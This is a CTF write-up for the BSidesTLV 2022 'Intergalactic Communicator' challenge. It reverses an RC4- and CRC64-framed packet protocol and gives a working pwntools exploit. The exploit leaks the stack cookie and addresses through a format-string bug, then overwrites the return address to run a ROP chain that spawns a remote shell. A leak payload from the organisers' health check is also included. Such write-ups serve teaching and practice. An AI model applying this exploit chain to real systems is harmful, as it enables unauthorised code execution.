---
title: BSidesTLV 2022 CTF – Intergalactic Communicator
date: '2022-06-30'
draft: false
authors: ['thebadgod']
tags: ['BSidesTLV 2022', 'pwn', 'reverse', 'rc4']
summary: 'pwn too easy, rev cancer.'
canonical: 'https://spclr.ch/bsidestlv2022-writeups'
---

## Intergalactic Communicator (500)

We get a tar gz archive with a docker container inside (An archived docker
container), the main thing inside we are interested in is the binary running
on the remote, so we either import the docker container or extract the layers
until we find the binary in `/usr/src/app/main`.

## Part 1: Reversing

### Header & checksum

The binary inside the docker container is statically compiled and stripped,
so it must be a hard challenge (as it turns out it actually isn't, it's just
cancerous).

We start at the function start (entrypoint) inside the binary, this calls
`libc_start_main`, where the first argument is the main function, going into
that we see that it runs an infinite loop and if it breaks it prints
"invalid packet", making an educated guess and saying that that function
probably is `fwrite`, the next one after that probably is `exit`, then
there are only three more functions, the first of which looks like a memset
call, to set a buffer of size 2048 to zero, the second one looks like fread
(Again looking at the arguments and seeing the stdin in fourth place).

So we read four bytes, put that into a variable, then swap the endianess
of said variable, if that value is now less than 12 we print "invalid
protocol header", so we have 12 bytes of header data, next we read the
amount of bytes specified by our input. So this input must have been
the packet length, the rest of the data is the payload.

This also means the last remaining function is the function responsible
for handling the packet data, it gets the packet data and its size.
In that function we load the first eight bytes of the data, xor it
with two different values and store those in a 16 byte buffer (The constants
spell out `NotFlag!` and `JustKey!` respectively, so I name the buffer key).
next we call a function where we give this buffer as first argument, then
the packet data (after the first eight bytes), then 16 and finally the packet
length minus eight. So we are entering the key and data and their sizes.

Looking at that function we see a few assertions (including file name, line
number and function name & arguments), so we can already name all of those.
If you've ever reversed malware (or some "secure" c2 server), this encryption
might look familiar, as it is just doing rc4 encryption. It mallocs a new buffer
for the output and returns a pointer to that.

Back in the function handling the packet we call memset on the packet data again,
then a function which takes the packet data pointer, the decrypted data pointer
and the size of the data, so this is probably just a memcpy. Then we clear the
allocated buffer and call free on it (Actually I didn't reverse that function, I
again just guessed it probably is free, since we don't use the buffer afterwards).

Next we have an if which checks that the output of a function, which takes the
data and its size, is equal to the first eight bytes of the packet - which we
used as the key for the decryption. If the check fails, we print "checksum failed"
and exit, so this makes it pretty clear that we're using some sort of checksum.
Looking at the function we see that there is a lookuptable. Googling the first
(nonzero) constant in that table leads us to the crc64 implementation of
redis which looks exactly like the implementation we got. So either we implement
this in python or we write the exploit in C and use this implementation...
Or we just use pwntools `generic_crc` which will work the same as this implementation
by just giving it the arguments which are defined at the top of the redis
implementation.

Next, if the checksum was correct, the packet data (without the checksum header)
is passed into another function, which then first takes an int from the data
(Finalizing the header) and performs a switch on the value of that, there
are five actions we can perform, it seems that the first one just prints a
number, so we change the function call with the format specified to `sprintf`,
the buffer we write into is used after the switch, first we put it into a
function which returns an int, which we send to the other side using fwrite,
then we pass the buffer into a second function. This looks like we're just
sending the size of the buffer and then the buffer, so I rename the functions
to `strlen` and `write_buffer` and the buffer to `output_data` respectively.
(I ignored the first if case in the function as it had to with futexes and
those are rarely important).

### API

So now we know how to communicate (and we can already write a script to
communicate which just sends packets and receives the answer), however
the interesting part starts now as we have to reverse the actual part
we can interact with, so let's look at the switch.

The first case just returns a numberm which is the result of a function
call with an object which seems to be referenced a lot.

The second case takes another int from the input data, puts it into
a function together with the weird object. Then we call a function
which just dereferences the returned value. Venturing a bit into the
first function we find the string `vector::_M_range_check`, which means
the object is likely just a vector and judging by the arguments this is
probably just the `operator[]`, the returned value is dereferenced, which
leads me to believe that it's a c++ string and we called the `c_str` method
on it. Considering this, we now can make a guess about the first case in
the switch, that being it's just getting the size of the vector.
Next we call `snprintf` (again based on the arguments), into a temporary
buffer, then we call some other method which again calls printf??
Yes as it looks like the temporary buffer is used as the format for
a printf to the output buffer... Well, if that's not handy...

The next case takes the rest of the buffer as a string (`char*`) and
calls another function with it, which probably means it's inserting
that into the list. Then we get the iterator and end iterator of that
returned string, then we clear the topmost bit of every char along the
way (We iterate over all the chars we just put into the string)
This is likely to limit us to ascii-only values, but we'll see about that

The fourth case just calls a function and returns "OK", my guess was this
clears the list and with a bit of experimenting that seemed to be the
case (not that I had to use this functionality)

The last case is again using an iterator, this time over the string in the
list, and it just concatenates them all into a giant string, which is
on the stack... In a buffer of size 2048... Where every string can
have up to 2048 chars... So yeah, this could be used to overflow the stack
quite a bit.

### Implementation

I implemented this protocol client in python:

```py
from pwn import *
from arc4 import ARC4

class Comm:
    crc64 = lambda x: crc.generic_crc(polynom=0xad93d23594c935a9,width=64,refin=True,refout=True,xorout=0,init=0,data=x)

    def __init__(self,r):
        self.r = r

    def send_packet(self, data):
        checksum = Comm.crc64(data)
        key = p64(checksum ^ 0x2167616C46746F4E) + p64(checksum ^ 0x2179654B7473754A)
        rc4 = ARC4(key)
        data = rc4.encrypt(data)
        totransmit = p32(len(data) + 8, endian="big") + p64(checksum) + data
        self.r.send(totransmit)

    def recv_packet(self):
        length = u32(self.r.recvn(4))
        data = self.r.recvn(length+1)
        return data

    def size(self):
        self.send_packet(p32(1))
        return int(self.recv_packet())

    def get(self, idx, optional=None):
        if not optional:
            optional = b""
        self.send_packet(p32(2) + p32(idx) + optional)
        return self.recv_packet()

    def add(self, data):
        self.send_packet(p32(3) + data)
        return self.recv_packet()

    def clear(self):
        self.send_packet(p32(4))
        return self.recv_packet()

    def broadcast(self):
        self.send_packet(p32(5))
        return self.recv_packet()
```

To use this class you have to give it a pwntools pipe as constructor argument
and then you can call the individual functions (Not that I only added
the optional packet data into the get method, but you could put that in
all the methods, I only needed it in the get function)

## Part 2: Pwn

The year is 2022 AD, Strings are entirely ascii. Well not entirely! One small
part of memory still holds out against the ascii-fication.

Well, first of all we want to leak data, like the aslr base and the stack
cookie, as well as the stack address (We might not need it, but I mean, why not)

To do this we just add a string with the text `%529$p %533$p %532$p`, then
print that string using the get method. We get these numbers by taking the
size of the stack frame (0x1078), dividing that by eight and then adding six
(The first six arguments are in registers, and on the stack every argument
is eight bytes). That is the pointer to the saved return address, just before
that is the saved rbp, and for some reason 3 spaces further back is the stack
cookie.

Now with these values we can just rop, right? Well yes, but actually no,
but actually actually yes.

The author made all the strings ascii-only, so we would have had to wait
for the stack cookie and the aslr base to be ascii-only for an exploit,
which seemed unrealistic, so I scrapped that idea (Which was the intended
solution btw...), then I noticed that the decrypted buffer is copied from
the heap onto the stack (for some reason) before it's being processed.
Which means we have all the binary values of the current packet on the stack,
or if we haven't overwritten them the previous ones.

Which means instead of looking at the current stack frame we look a bit further
up in the stack frame of main and voilà, we find the values we are looking for,
luckily pwntools not only has the function `fmtstr_payload`, but also
`fmtstr_split`, which returns the format string and the binary data required.

So after leaking the values, we can continue to create a ropchain (pwntools
actually worked here, so just do a call to execve, don't forget to set the base
stack address).
Next we somehow want the thing to jump to our payload, so we make a formatstring
payload which uses the binary data in the packet and overwrites the return address
with a ropgadget to increase the stack pointer (So it ends up in our buffer)

Next we just add the format, then get the string (which executes the vulnerability),
with optional data being set to the formatstring payload and the ropchain.

There are some magic values, but they're not really that magic, the base
stack address is just calculated, since we have two returns and the gadget
increases the stack address by 0x78, we have a total of 0x88 bytes,
the 0x14fd22 is the offset to that gadget, the 553 is the offset into the
buffer in the stack frame of main (which can be calculated using the stack
frame sizes of all functions up to main and the return addresses, or by
guessing and adjusting)

The final payload has some space in between the format string data and
the ropchain, which i just filled with a bunch of 0s.

```py
if args.LOCAL:
    if args.GDB:
        r = gdb.debug(["./main"],aslr=False)
    else:
        r = process(["./main"])
else:
    r = remote("intergalactic-communicator.ctf.bsidestlv.com", 8080)
comm = Comm(r)

context.binary = exe = ELF("./main")

comm.add(b"%529$p %533$p %532$p")
leaks = comm.get(0)[20:]
stack_cookie = int(leaks.split(b" ")[0],16)
exe.address = int(leaks.split(b" ")[1],16) - 0x1C27E
stack_address = int(leaks.split(b" ")[2],16)
info("Stack cookie: 0x%x, ASLR base: 0x%x, Stack addr: 0x%x", stack_cookie, exe.address, stack_address)

rop = ROP(exe,base=stack_address+0x88)
#rop.raw(rop.find_gadget(["ret"]).address)
rop.call('execve', [b'/bin/sh', [["sh"], 0], 0])
start_addr = stack_address + 8
ropchain = rop.chain()

comm.clear()
fmt,data = fmtstr_split(553, {
    start_addr: exe.address + 0x14fd22
}, numbwritten=20)
comm.add(fmt)
data = data + b"0"*(0x50 - len(data))
comm.get(0, data+ropchain)

r.sendline(b"ls")
r.interactive()
```

## Links

- [https://sourcegraph.com/github.com/sourcegraph/lsif-demos/-/blob/c-cpp-redis/src/crc64.c?L9](Redis crc64)

## Healthcheck

Found this on the remote called `health_check.py`

```py
import socket
import sys
import re

server = 'localhost'
port = 8080
check = b'\x00\x00\x00\x0c\xa9\xff\xaf\xc0\xbc\x1b\xacW5\xc9A\x11'
leak = b"\x00\x00\x00>\\E\xc5h\x06\xc4\xd3c\xb4Ng\x04-\x10\xa1\x05fJ\xfb]\xbff*Ww46\xe1\xfb2\x80k\xd43\t)\xd7`\xc4\x91\xec\x9e\xef\xb2rC\x12J\xcb\x83\x1a2o\xfc\xb3\x0f\x190\xaf\x9a\xaf'"
read = b'\x00\x00\x00\x10\x88\x88\xde\x92+\x00:pu\x92\xe5\xb8\xd6\xd0w\xf7'

def send_exploit(sock, buffer: bytes, read_response=False, health=False):
    sock.send(buffer)

    if read_response:
        size = int.from_bytes(sock.recv(4), 'little')
        resp = sock.recv(size + 1)

        if health:
            if b'Welcome to the Intergalactic Communicator' not in resp:
                sock.close()
                sys.exit(1)
            return True

        if b'canary:' in resp:
            match = re.findall(rb'shellcode:([0-9A-Fa-fXx]*?):base:([0-9A-Fa-fXx]*?):canary:([0-9A-Fa-fXx]*?):', resp)
            return True

        return False


def get_connection(ip: str, port: int) -> socket.socket:
    sock = None
    while sock is None:
        try:
            sock = socket.create_connection((ip, port))
        except ConnectionRefusedError:
            continue
    return sock


def main():
    conn = get_connection(server, port)
    try:
        # Checking for welcome message
        if not send_exploit(conn, check, True, True):
            conn.close()
            sys.exit(1)

        # Sending leak payload
        send_exploit(conn, leak, True)

        # Checking if leaked pointers
        if not send_exploit(conn, read, True):
            conn.close()
            sys.exit(1)
    except:
        conn.close()
        sys.exit(1)
    conn.close()
    sys.exit(0)


if __name__ == '__main__':
    main()
```

## Final remarks

The challenge was statically compiled and stripped, which is just an artificial
increase in difficulty, in the end there was nothing in this challenge which made
it worth the 500 points it was (in my opinion). But people couldn't solve it
(probably also due to the reversing part), which makes the authors believe they
actually made a hard challenge.

This is not the case, this challenge was pretty easy once I had the packet sending
done, I just had to find a bunch of offsets and was done. Also the intended solution
for the pwn part was ridiculous, I don't want to bruteforce 16000 to 20000 attempts
just to get ascii (and non-null) stack cookie & aslr base, that is not fun to exploit
on a remote system where every connection takes way longer than locally.

TLDR: pwn too easy, rev cancer.
